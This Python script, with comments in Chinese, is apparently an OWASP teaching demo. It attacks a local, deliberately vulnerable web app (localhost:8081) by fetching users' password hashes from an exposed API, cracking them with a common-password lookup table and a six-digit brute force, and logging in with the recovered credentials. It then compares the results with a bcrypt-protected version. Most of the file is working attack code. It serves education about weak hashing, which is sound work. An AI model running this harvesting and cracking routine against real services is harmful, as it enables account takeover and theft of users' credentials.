#!/usr/bin/env python3
"""
MD5 雜湊破解腳本
================
此腳本展示如何利用弱雜湊演算法（MD5/SHA1）進行密碼破解。

攻擊原理：
---------
1. MD5/SHA1 是快速雜湊，可被 GPU 快速暴力破解
2. 無 salt 的雜湊可被彩虹表查詢
3. 常見密碼的 MD5 雜湊已被預先計算

CWE-327: Use of a Broken or Risky Cryptographic Algorithm
CWE-328: Reversible One-Way Hash
CWE-916: Use of Password Hash With Insufficient Computational Effort

作者：OWASP Demo
"""

import requests
import hashlib
import argparse
import time

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# 常見密碼字典（Top 100）
COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "iloveyou", "trustno1", "sunshine",
    "master", "welcome", "shadow", "ashley", "football",
    "jesus", "michael", "ninja", "mustang", "password1",
    "123456a", "abc123", "admin", "admin123", "root",
    "letmein", "monkey", "696969", "batman", "starwars",
    "killer", "superman", "hello", "charlie", "whatever",
    "donald", "passw0rd", "qwerty123", "zaq12wsx", "1q2w3e4r",
    "princess", "solo", "qazwsx", "login", "starwars",
    "121212", "flower", "passw0rd", "dragon", "password123",
    "user123", "user", "test", "test123", "guest",
    "guest123", "root123", "toor", "administrator", "admin1",
    "admin@123", "P@ssw0rd", "Password1", "Password123", "Qwerty123",
    # 新增一些特定的測試密碼
    "hello", "world", "alice123", "bob123", "secret",
]

# 預計算的 MD5 彩虹表（常見密碼）
RAINBOW_TABLE = {}


def build_rainbow_table():
    """建立 MD5 彩虹表"""
    global RAINBOW_TABLE
    for pwd in COMMON_PASSWORDS:
        md5_hash = hashlib.md5(pwd.encode()).hexdigest()
        RAINBOW_TABLE[md5_hash] = pwd
        
        # 也加入 SHA1
        sha1_hash = hashlib.sha1(pwd.encode()).hexdigest()
        RAINBOW_TABLE[sha1_hash] = pwd


def crack_hash(hash_value: str) -> str:
    """
    使用彩虹表破解雜湊
    """
    return RAINBOW_TABLE.get(hash_value.lower())


def get_user_sensitive_data(user_id: int, url: str = VULNERABLE_URL) -> dict:
    """
    從漏洞版本取得使用者敏感資料
    """
    response = requests.get(f"{url}/api/users/{user_id}/sensitive")
    if response.status_code == 200:
        return response.json()
    return None


def export_users(url: str = VULNERABLE_URL) -> list:
    """
    匯出所有使用者資料
    """
    response = requests.get(f"{url}/api/users/export")
    if response.status_code == 200:
        return response.json().get("users", [])
    return []


def attack_crack_password_hashes():
    """
    🔴 攻擊：破解密碼雜湊
    """
    print("\n" + "=" * 60)
    print("🔴 MD5 密碼雜湊破解攻擊")
    print("=" * 60)
    
    print("\n📋 步驟 1：從 API 取得使用者敏感資料...")
    
    cracked_users = []
    
    for user_id in [1, 2, 3]:
        data = get_user_sensitive_data(user_id)
        if data:
            username = data.get("username")
            password_hash = data.get("passwordHash")
            algorithm = data.get("hashAlgorithm", "MD5")
            
            print(f"\n👤 使用者：{username}")
            print(f"   雜湊：{password_hash}")
            print(f"   演算法：{algorithm}")
            
            # 嘗試破解
            password = crack_hash(password_hash)
            if password:
                print(f"   ✅ 破解成功！密碼：{password}")
                cracked_users.append({
                    "username": username,
                    "hash": password_hash,
                    "password": password
                })
            else:
                print(f"   ❌ 彩虹表中找不到")
    
    print("\n📊 破解結果：")
    print(f"   成功破解：{len(cracked_users)} 個帳號")
    
    if cracked_users:
        print("\n📋 可登入的帳號：")
        for user in cracked_users:
            print(f"   - {user['username']} / {user['password']}")
        
        # 嘗試登入驗證
        print("\n🎯 驗證登入...")
        for user in cracked_users:
            response = requests.post(
                f"{VULNERABLE_URL}/api/auth/login",
                json={"username": user["username"], "password": user["password"]}
            )
            if response.status_code == 200:
                print(f"   ✅ {user['username']} 登入成功！")
            else:
                print(f"   ❌ {user['username']} 登入失敗")


def attack_rainbow_table():
    """
    🔴 攻擊：彩虹表查詢
    """
    print("\n" + "=" * 60)
    print("🔴 彩虹表攻擊演示")
    print("=" * 60)
    
    # 測試雜湊
    test_hashes = [
        ("0192023a7bbd73250516f069df18b500", "admin123", "MD5"),  # admin123
        ("6ad14ba9986e3615423dfca256d04e3f", "user123", "MD5"),   # user123
        ("5d41402abc4b2a76b9719d911017c592", "hello", "MD5"),     # hello
        ("e10adc3949ba59abbe56e057f20f883e", "123456", "MD5"),    # 123456
        ("d8578edf8458ce06fbc5bb76a58c5ca4", "qwerty", "MD5"),    # qwerty
    ]
    
    print("\n📋 彩虹表查詢測試：")
    print("-" * 60)
    
    for hash_val, expected, algo in test_hashes:
        start = time.time()
        result = crack_hash(hash_val)
        elapsed = time.time() - start
        
        if result:
            status = "✅" if result == expected else "⚠️"
            print(f"{status} {hash_val[:20]}... → {result} ({elapsed*1000:.2f}ms)")
        else:
            print(f"❌ {hash_val[:20]}... → 未找到")
    
    print("\n⚠️ 彩虹表查詢是瞬間完成的！")
    print("   攻擊者可以預先計算數十億個常見密碼的雜湊")


def attack_brute_force_md5():
    """
    🔴 攻擊：暴力破解 MD5（演示）
    """
    print("\n" + "=" * 60)
    print("🔴 暴力破解 MD5（演示）")
    print("=" * 60)
    
    target_hash = "e10adc3949ba59abbe56e057f20f883e"  # 123456
    print(f"\n📋 目標雜湊：{target_hash}")
    
    print("\n🎯 開始暴力破解（6位數字）...")
    
    start = time.time()
    found = None
    attempts = 0
    
    for i in range(1000000):
        candidate = str(i).zfill(6)
        md5_hash = hashlib.md5(candidate.encode()).hexdigest()
        attempts += 1
        
        if md5_hash == target_hash:
            found = candidate
            break
        
        if i % 100000 == 0:
            print(f"   已嘗試：{i:,} 個...")
    
    elapsed = time.time() - start
    
    if found:
        print(f"\n✅ 破解成功！")
        print(f"   密碼：{found}")
        print(f"   嘗試次數：{attempts:,}")
        print(f"   耗時：{elapsed:.2f} 秒")
        print(f"   速度：{attempts/elapsed:,.0f} 雜湊/秒")
        
        print("\n⚠️ 使用 GPU 可達到每秒數十億次雜湊！")
        print("   RTX 4090: ~164 億 MD5/秒")
        print("   8 字元密碼（小寫+數字）: < 1 小時破解")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 密碼雜湊：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    # 測試漏洞版本
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    
    # 取得 MD5 雜湊
    response = requests.post(
        f"{VULNERABLE_URL}/api/crypto/hash",
        json={"password": "test123", "algorithm": "MD5"}
    )
    if response.status_code == 200:
        data = response.json()
        print(f"   演算法：{data.get('algorithm')}")
        print(f"   雜湊：{data.get('hash')}")
        print(f"   ⚠️ 回傳原始密碼：{data.get('password')}")
        print(f"   ⚠️ 警告：{data.get('warning')}")
        
        # 破解
        cracked = crack_hash(data.get('hash'))
        if cracked:
            print(f"   ❌ 彩虹表破解：{cracked}")
    
    # 測試安全版本
    print("\n🔒 安全版本（http://localhost:8082）：")
    
    response = requests.post(
        f"{SECURE_URL}/api/crypto/hash",
        json={"password": "test123"}
    )
    if response.status_code == 200:
        data = response.json()
        print(f"   演算法：{data.get('algorithm')}")
        print(f"   雜湊：{data.get('hash')[:60]}...")
        print(f"   ✅ 不回傳原始密碼")
        print(f"   ✅ BCrypt 包含 salt，無法用彩虹表破解")
    else:
        print(f"   回應：{response.status_code}")
    
    print("\n📋 比較：")
    print("   ╔═══════════════╦════════════════════╦════════════════════╗")
    print("   ║ 項目          ║ 漏洞版本           ║ 安全版本           ║")
    print("   ╠═══════════════╬════════════════════╬════════════════════╣")
    print("   ║ 演算法        ║ MD5（已破解）      ║ BCrypt（安全）     ║")
    print("   ║ Salt          ║ 無                 ║ 自動包含           ║")
    print("   ║ 彩虹表攻擊    ║ ❌ 可被破解        ║ ✅ 無效            ║")
    print("   ║ 暴力破解      ║ ❌ 快速（GPU）     ║ ✅ 極慢（故意的）  ║")
    print("   ║ Work Factor   ║ 無                 ║ 12（可調整）       ║")
    print("   ╚═══════════════╩════════════════════╩════════════════════╝")


def main():
    parser = argparse.ArgumentParser(
        description="MD5 雜湊破解工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python md5_crack.py --crack         # 從 API 取得雜湊並破解
  python md5_crack.py --rainbow       # 彩虹表攻擊演示
  python md5_crack.py --brute         # 暴力破解演示
  python md5_crack.py --compare       # 比較漏洞/安全版本
  python md5_crack.py --all           # 執行完整演示
        """
    )
    
    parser.add_argument("--crack", action="store_true", help="破解密碼雜湊")
    parser.add_argument("--rainbow", action="store_true", help="彩虹表攻擊")
    parser.add_argument("--brute", action="store_true", help="暴力破解演示")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔓 MD5 雜湊破解工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    
    # 建立彩虹表
    print("\n📋 建立彩虹表...")
    build_rainbow_table()
    print(f"   已載入 {len(RAINBOW_TABLE)} 個雜湊")
    
    if args.all:
        attack_crack_password_hashes()
        attack_rainbow_table()
        attack_brute_force_md5()
        compare_vulnerability()
    elif args.crack:
        attack_crack_password_hashes()
    elif args.rainbow:
        attack_rainbow_table()
    elif args.brute:
        attack_brute_force_md5()
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\n💡 快速開始：python md5_crack.py --all")


if __name__ == "__main__":
    main()
